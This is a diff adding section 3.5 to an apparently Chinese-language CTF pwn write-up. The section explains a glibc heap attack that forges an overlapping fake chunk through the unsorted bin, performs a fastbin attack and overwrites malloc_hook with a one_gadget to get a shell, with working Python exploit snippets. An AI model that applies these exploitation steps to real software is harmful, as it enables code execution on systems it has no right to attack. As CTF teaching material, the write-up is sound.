@@ -23,7 +23,7 @@ menu题目<br>
 3.2.和第一种类似，也是将chunkc in use位写0，通过free(chunka)，之后通过unlink 去consolidate(chunkb)，让chunka和chunkb合并。使用malloc切割chunkab来写chunkb<br>
 3.3.修改t_arena中top chunk的地址，在chunka中伪造一个top chunk，在t_arena的top chunk地址最低位写0，这个地址刚好落在chunka内，如果此时在申请一个chunkc，就会造成chunkb和chunkc的overlap，就可以使用chunkc去修改chunkb。完成fastbin attack。<br>
 3.4.house of force。修改top chunk size,通过malloc 将top chunk size推向高地址free_hook，然后计算好值，使得free_hook值刚好为system_addr，这样在free()的时候就可以条用system来getshell了
-3.5.
+3.5.修改t_arena中unsorted bin上chunkb的位置，伪造出一个fake chunkb,这个fake chunkb和chunka存在overlap，然后就可以完成fastbin attack
 
 
 
@@ -187,8 +187,54 @@ Q：为什么不用one_gadget?为什么不用malloc_hook?<br>
 ![3.4.2](img/3.4.2.PNG)<br>
 free函数内call free_hook时的状态<br>
 ![3.4.3](img/3.4.3.PNG)<br>
-### 3.5.
+### 3.5.修改t_arena中fastbin上chunkb的位置，伪造出一个fake chunkb,这个fake chunkb和chunka存在overlap
+修改t_arena中unsortedbin中的地址，让原本指向chunkb的指针，指向伪造的chunkb<br>
+伪造的chunkb的header是在chunka中构造，data区域覆盖chunkb的header。<br>
+由于要free(chunkb),之后还会malloc(big_size)，malloc(big_size)会触发consolidate机制<br>
+consolidate机制会将chunkb(freed，fastbin)放到unsortedbin上，并且在其fd和bk上填充上unsortedbin的地址<br>
+所以伪造的chunkb也要在fd和bk上填充上相应的地址，所以第一个new会有p64(unsortedbin)
+第二个new之所以还有一个p64(0x75)，是为了接下来绕过free chunkb(fastbin)时，next size的检测机制<br>
+```
+  malloc_hook=main_arena-0x78+5-0x18
+  ubin=heap_addr-0x78+0xd8
+  new(0,main_arena,'') #整理heap区域
+  payload='A'*0x40+p64(0)+p64(0x75)+p64(ubin)+p64(ulbin)
 
+  new(0,0x78,payload)
+  new(1,0x68,'B'*0x30+p64(0)+p64(0x75)+'B'*0x18)
+  new(2,0x68,'C'*0xef)
+  delete(1)
+```
+此时还没有malloc(big_size)，chunkb还放在fastbin上，fd和bk还没有被填充成unsortedbin的地址<br>
+![3.5.1](img/3.5.1.PNG)<br>
+malloc(big_size)的时候，会将fastbin上的chunkb转移到unsortedbin上，所以这个时候直接修改unsortedbin上的值<br>
+`new(1,0x68,xxx)`这个从unsoterbin new出来的chunk块就是伪造的chunkb<br>
+然后将chunka和chunkb free掉，重新放进fastbin中<br>
+这个时候就可以通过chunka写chunkb了
+```
+  new(1,heap_addr-0x78+0xf0+1,'')
+  new(1,heap_addr-0x78+0xe8+1,'')
+  new(1,0x68,'')
+  delete(1)
+  delete(0)
+```
+![3.5.2](img/3.5.2.PNG)<br>
+用chunka写chunkb，然后将malloc_hook附近的chunk malloc出来。<br>
+```
+  payload='A'*0x40 + p64(0)+p64(0x75)+p64(malloc_hook)
+  new(0,0x78,payload)
+  new(1,0x68,'')
+  delete(0)
+  one_gadget=main_arena-0x3c4b20+0x4526a
+  new(0,0x68,'A'*19 + p64(one_gadget))
+  delete(2)
+  p.sendline('1')#手动new
+  p.sendline('2')
+  p.sendline('2')
+```
+![3.5.3](img/3.5.3.PNG)<br>
+malloc_hook填充成one_gadget<br>
+![3.5.4](img/3.5.4.PNG)<br>
 
 
 
